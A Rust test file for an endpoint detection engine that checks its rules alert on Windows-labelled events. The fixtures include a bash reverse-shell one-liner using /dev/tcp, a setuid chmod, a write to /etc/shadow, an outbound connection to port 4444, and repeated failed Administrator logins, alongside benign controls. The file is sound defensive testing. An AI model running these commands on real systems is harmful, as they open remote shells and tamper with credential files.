use os_defender_core::detection::{default_ruleset, DetectionEngine};
use os_defender_core::events::*;

fn windows_process_event(name: &str, exe: &str, cmdline: &str, ppid: u32) -> NormalizedEvent {
    NormalizedEvent::new("win-ep".into(), OsType::Windows, EventType::Process, Severity::Info)
        .with_process(ProcessContext {
            pid: 5678,
            ppid: Some(ppid),
            name: name.into(),
            exe: Some(exe.into()),
            cmdline: Some(cmdline.into()),
            uid: None,
            username: None,
            start_time: None,
            children_pids: vec![],
        })
}

fn windows_file_event(path: &str, action: FileAction) -> NormalizedEvent {
    NormalizedEvent::new("win-ep".into(), OsType::Windows, EventType::File, Severity::Info)
        .with_file(FileContext {
            path: path.into(),
            action,
            sha256: None,
            size_bytes: None,
            owner_uid: None,
            permissions: None,
        })
}

fn windows_network_event(
    dir: NetDirection,
    remote_addr: &str,
    remote_port: u16,
    proc_name: &str,
) -> NormalizedEvent {
    NormalizedEvent::new("win-ep".into(), OsType::Windows, EventType::Network, Severity::Info)
        .with_network(NetworkContext {
            protocol: NetworkProtocol::Tcp,
            direction: dir,
            local_addr: "192.168.1.10".into(),
            local_port: 49152,
            remote_addr: Some(remote_addr.into()),
            remote_port: Some(remote_port),
            state: None,
            pid: Some(5678),
            process_name: Some(proc_name.into()),
            bytes_sent: None,
            bytes_received: None,
        })
}

fn windows_auth_event(action: AuthAction, user: &str, source: Option<&str>) -> NormalizedEvent {
    NormalizedEvent::new("win-ep".into(), OsType::Windows, EventType::Authentication, Severity::Info)
        .with_auth(AuthContext {
            action,
            username: user.into(),
            source_addr: source.map(|s| s.into()),
            method: None,
            service: Some("Security".into()),
            session_id: None,
        })
}

#[test]
fn windows_event_serialization_roundtrip() {
    let event = NormalizedEvent::new(
        "win-ep-001".into(),
        OsType::Windows,
        EventType::Process,
        Severity::High,
    )
    .with_process(ProcessContext {
        pid: 4321,
        ppid: Some(1),
        name: "cmd.exe".into(),
        exe: Some("C:\\Windows\\System32\\cmd.exe".into()),
        cmdline: Some("cmd.exe /c whoami".into()),
        uid: None,
        username: Some("Administrator".into()),
        start_time: None,
        children_pids: vec![],
    });

    let json = serde_json::to_string(&event).unwrap();
    let restored: NormalizedEvent = serde_json::from_str(&json).unwrap();
    assert_eq!(restored.os_type, OsType::Windows);
    assert_eq!(restored.event_id, event.event_id);
    assert_eq!(restored.process_context.unwrap().name, "cmd.exe");
}

#[test]
fn detection_rules_fire_on_windows_reverse_shell() {
    let mut engine = DetectionEngine::new(default_ruleset());
    let event = windows_process_event(
        "cmd.exe",
        "C:\\Windows\\System32\\cmd.exe",
        "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
        100,
    );
    let alerts = engine.process_event(&event);
    assert!(!alerts.is_empty(), "reverse shell pattern should alert on Windows events");
    assert_eq!(alerts[0].severity, Severity::High);
}

#[test]
fn detection_rules_fire_on_windows_suid_attempt() {
    let mut engine = DetectionEngine::new(default_ruleset());
    let event = windows_process_event(
        "chmod",
        "chmod",
        "chmod +s C:\\Users\\exploit.exe",
        100,
    );
    let alerts = engine.process_event(&event);
    assert!(!alerts.is_empty(), "chmod +s pattern should alert");
}

#[test]
fn detection_rules_fire_on_windows_file_tampering() {
    let mut engine = DetectionEngine::new(default_ruleset());
    // /etc paths are Linux-specific, but the rule checks path.contains()
    let event = windows_file_event("/etc/shadow", FileAction::Modify);
    let alerts = engine.process_event(&event);
    assert!(!alerts.is_empty(), "sensitive file rule fires regardless of OsType");
}

#[test]
fn detection_rules_fire_on_windows_anomalous_network() {
    let mut engine = DetectionEngine::new(default_ruleset());
    let event = windows_network_event(
        NetDirection::Outbound,
        "1.2.3.4",
        4444,
        "malware.exe",
    );
    let alerts = engine.process_event(&event);
    assert!(!alerts.is_empty(), "backdoor port should alert on Windows events");
    assert_eq!(alerts[0].severity, Severity::High);
}

#[test]
fn brute_force_rule_fires_on_windows_auth_failures() {
    let mut engine = DetectionEngine::new(default_ruleset());

    // Accumulate failures — threshold is 5 within the 300s window
    let mut total_alerts = 0;
    for _ in 0..10 {
        let event = windows_auth_event(
            AuthAction::Failed,
            "Administrator",
            Some("10.0.0.50"),
        );
        total_alerts += engine.process_event(&event).len();
    }
    assert!(
        total_alerts > 0,
        "brute-force should fire after 10 failed auth attempts from same source"
    );
}

#[test]
fn normal_windows_process_does_not_alert() {
    let mut engine = DetectionEngine::new(default_ruleset());
    let event = windows_process_event(
        "notepad.exe",
        "C:\\Windows\\System32\\notepad.exe",
        "notepad.exe document.txt",
        1,
    );
    let alerts = engine.process_event(&event);
    assert!(alerts.is_empty(), "normal process should not alert");
}

#[test]
fn normal_windows_network_does_not_alert() {
    let mut engine = DetectionEngine::new(default_ruleset());
    let event = windows_network_event(
        NetDirection::Outbound,
        "1.2.3.4",
        443,
        "chrome.exe",
    );
    let alerts = engine.process_event(&event);
    assert!(alerts.is_empty(), "HTTPS on 443 should not alert");
}

#[test]
fn os_type_is_preserved_in_events() {
    let linux_event = NormalizedEvent::new("ep".into(), OsType::Linux, EventType::Process, Severity::Info);
    let windows_event = NormalizedEvent::new("ep".into(), OsType::Windows, EventType::Process, Severity::Info);
    assert_eq!(linux_event.os_type, OsType::Linux);
    assert_eq!(windows_event.os_type, OsType::Windows);
    assert_ne!(linux_event.os_type, windows_event.os_type);
}
